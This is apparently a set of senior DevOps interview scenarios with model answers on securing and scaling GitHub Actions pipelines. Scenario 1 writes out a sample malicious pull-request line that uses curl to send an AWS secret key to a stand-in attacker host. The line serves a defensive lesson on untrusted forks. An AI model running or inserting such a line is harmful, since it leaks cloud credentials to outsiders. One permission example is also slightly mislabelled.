# GitHub Actions: Senior / Lead DevOps Interview Scenarios (6+ Years Experience)

This document contains deep, real-world architectural and incident-response interview scenarios frequently tested in Senior DevOps, SRE, and Platform Engineering interviews.

---

### Scenario 1: Mitigating Poisoned Pipeline Execution (PPE) & Malicious PRs from Forks
**Context**: An open-source or inner-source enterprise repository allows contributors to submit Pull Requests. A developer notices a PR that adds a line in the test script: `curl http://attacker.com?token=$AWS_SECRET_ACCESS_KEY`.

**Interview Question**:
> *"How do you architect GitHub Actions workflows to guarantee that pull requests from external forks or untrusted contributors cannot access your organization's secrets, cloud credentials, or internal networks?"*

**Expected Senior/Lead Response**:
1. **Trigger Separation (`pull_request` vs `pull_request_target`)**:
   - `pull_request` runs in the context of the fork. It has **read-only permissions** to the base repo and **zero access to secrets**. This is safe for running untrusted tests.
   - `pull_request_target` runs in the context of the base repository and has access to secrets. **Never checkout untrusted PR head code** inside a `pull_request_target` workflow (`ref: ${{ github.event.pull_request.head.sha }}`). If you must use `pull_request_target`, separate testing from secret-bearing deployment jobs.
2. **Environment Protection Rules**:
   - Require explicit approval from a designated team (e.g. Platform Team) before jobs targeting production or staging environments are dispatched.
3. **Runner Isolation**:
   - Never run untrusted fork PRs on private, self-hosted runners that have route table access to corporate VPCs or internal databases. Run them strictly on ephemeral GitHub-hosted runners or network-isolated Kubernetes namespaces.
4. **Least-Privilege Token Scoping**:
   - Top-level `permissions: {}` setting read-only or empty scopes globally, granting write scopes (`id-token: write`, `contents: read`) only to specific jobs.

---

### Scenario 2: Actions Runner Controller (ARC) Scaling Bottlenecks & Pod Starvation
**Context**: During peak development hours (10:00 AM - 3:00 PM), 40 engineering teams push code simultaneously. The CI queue explodes with 250+ queued jobs. Engineers report jobs waiting 20 minutes before a runner starts.

**Interview Question**:
> *"How do you diagnose and resolve runner queue latency when running Actions Runner Controller (ARC) on AWS EKS?"*

**Expected Senior/Lead Response**:
1. **Root Cause Analysis (RCA)**:
   - Check ARC controller logs for GitHub API rate-limiting (`403 API rate limit exceeded`). Ensure ARC uses a **GitHub App** (15,000 requests/hr) instead of a Personal Access Token (5,000 requests/hr).
   - Check Kubernetes cluster node capacity: Are runner pods stuck in `Pending` state due to `Insufficient cpu/memory`?
2. **Kubernetes Autoscaling Strategy**:
   - Replace standard Cluster Autoscaler with **Karpenter**. Karpenter provisions right-sized EC2 Spot instances in under 45 seconds directly responding to Pod pending signals.
   - Configure ARC's `HorizontalRunnerAutoscaler` (HRA) using the **PercentageRunnersBusy** metric or the **GitHub Webhook-driven** autoscaling model rather than poll-based scheduling.
3. **Instance Fleet Optimization**:
   - Use AWS Spot Instances across diversified instance types (`c5.2xlarge`, `c6i.2xlarge`, `m5.2xlarge`) with fallback to On-Demand to avoid Spot interruption failures.
4. **Local Image Pre-pulling**:
   - Build custom runner base images containing pre-cached Docker daemons, Go/Node runtimes, and common tools so pods don't waste 3 minutes downloading tools at runtime.

---

### Scenario 3: Monorepo Pipeline Optimization: 50-Minute Builds to 5 Minutes
**Context**: An enterprise migrated 18 microservices into a single monorepo. Every time any developer pushes a 1-line documentation fix, the entire pipeline builds all 18 Docker containers, taking 52 minutes.

**Interview Question**:
> *"How do you re-architect the GitHub Actions pipeline to eliminate redundant builds and slash execution time down to under 6 minutes?"*

**Expected Senior/Lead Response**:
1. **Dynamic Path Filtering (`dorny/paths-filter` / git diff)**:
   - Implement an initial job that evaluates `git diff --name-only` between the target branch and the PR head.
   - Output a JSON array containing only the microservices that have file changes.
2. **Dynamic Matrix Generation**:
   - Feed the JSON array into a matrix job: `services: ${{ fromJSON(needs.detect.outputs.changed_services) }}`. If only `payment-service` changed, only 1 job executes.
3. **BuildKit Layer Cache with Registry Cache**:
   - Use `cache-from: type=registry,ref=.../cache:buildcache` and `cache-to: type=registry,mode=max`. Docker downloads only updated layers instead of recompiling standard libraries.
4. **Concurrency Cancel-In-Progress**:
   ```yaml
   concurrency:
     group: ${{ github.workflow }}-${{ github.ref }}
     cancel-in-progress: true
   ```
   If a developer pushes a new commit to the same PR, immediately kill the previous running pipeline to release runner slots.

---

### Scenario 4: OIDC AssumeRoleWithWebIdentity Failing with `Not Authorized`
**Context**: A team switches from AWS Access Keys to GitHub Actions OIDC. The workflow fails at `aws-actions/configure-aws-credentials` with:
`Error: Credentials could not be loaded, please check your action inputs: Could not load credentials from any providers: AssumeRoleWithWebIdentity: Access denied`.

**Interview Question**:
> *"What is your systematic troubleshooting checklist to fix this OIDC authentication failure?"*

**Expected Senior/Lead Response**:
1. **Workflow Permissions**:
   - Check if `permissions: id-token: write` is declared at the top-level or job-level. Without this, GitHub will not generate the OIDC JSON Web Token (JWT).
2. **AWS IAM Identity Provider**:
   - Verify that an OpenID Connect Provider exists in AWS IAM with Provider URL: `https://token.actions.githubusercontent.com` and Audience: `sts.amazonaws.com`.
3. **Trust Policy Condition Mismatch**:
   - Inspect the IAM Role Trust Policy `Condition` block. Common pitfalls:
     - Branch name format: GitHub sends `repo:<org>/<repo>:ref:refs/heads/<branch>`. If the trust policy specifies `repo:<org>/<repo>:branch:<branch>`, it fails.
     - Case sensitivity: GitHub org and repo names are strictly case-sensitive in the claims.
     - Wildcard operator: Ensure `StringLike` is used instead of `StringEquals` when using wildcards `*`.
4. **Inspect Claims via Step Debugging**:
   - Add a step to inspect the token claims using `curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL"` and decode the JWT on `jwt.io` to inspect actual `sub` and `aud` values.

---

### Scenario 5: Secret Masking Failure & Accidental Credential Exposure
**Context**: A developer runs a debug script: `echo "DB_URL: $DATABASE_CONNECTION_STRING"` where the connection string contains `postgres://user:p@ssw0rd123@db.prod.internal:5432/app`. GitHub Actions masked the password, but the internal DNS host and username were exposed, and parts of the base64-encoded token appeared in a downstream crash dump.

**Interview Question**:
> *"How does GitHub Actions masking work under the hood, why can it fail, and what defense-in-depth measures do you implement?"*

**Expected Senior/Lead Response**:
1. **Masking Mechanics & Limitations**:
   - GitHub Actions masks secrets by searching stdout/stderr for exact string matches of registered secret values and replacing them with `***`.
   - **How it fails**:
     - Transformed secrets: If the secret is Base64-encoded, URL-encoded, or split into substrings, the exact pattern matcher misses it.
     - Very short secrets (1-2 characters) are not masked by GitHub to avoid masking entire logs.
2. **Remediation & Defense-in-Depth**:
   - Use `add-mask` for any derived values: `echo "::add-mask::$ENCODED_SECRET"`.
   - Implement pre-commit hooks and CI scanner steps like **Gitleaks** or **TruffleHog** to scan all generated logs and git history for entropy patterns and credential signatures.
   - Rotate any secret exposed in logs immediately via automated vault/KMS rotation pipelines.

---

### Scenario 6: Reusable Workflows vs Starter Workflows Governance
**Context**: You are the Platform Lead for 200 developers. You need to ensure that every Java and Node.js microservice runs SonarQube quality gates, vulnerability scanning, and publishes signed images without every team copy-pasting 300 lines of YAML.

**Interview Question**:
> *"How do you design, version, and enforce central CI pipelines across dozens of independent repositories?"*

**Expected Senior/Lead Response**:
1. **Central Reusable Workflows (`central-devops-templates/.github/workflows/standard-ci.yml`)**:
   - Centralize pipelines in a dedicated, restricted repository.
   - Expose pipelines via `on: workflow_call` with strict typed `inputs` and `secrets`.
2. **Semantic Versioning & Pinning**:
   - Teams consume the reusable workflow pinned to a tag: `uses: enterprise/ci/.github/workflows/service-ci.yml@v2.3.0`.
   - Critical security patches can be released under semantic versions; breaking changes bump major versions (`v3`).
3. **Organization Rulesets**:
   - Use **GitHub Repository Rulesets** or **Branch Protection Rules** requiring required status checks (e.g. `SonarQube Gate / SAST`, `Trivy Vulnerability Scan`) to pass before merging PRs.
   - Enforce that workflows cannot be edited in application repositories without Platform Team CODEOWNERS approval.
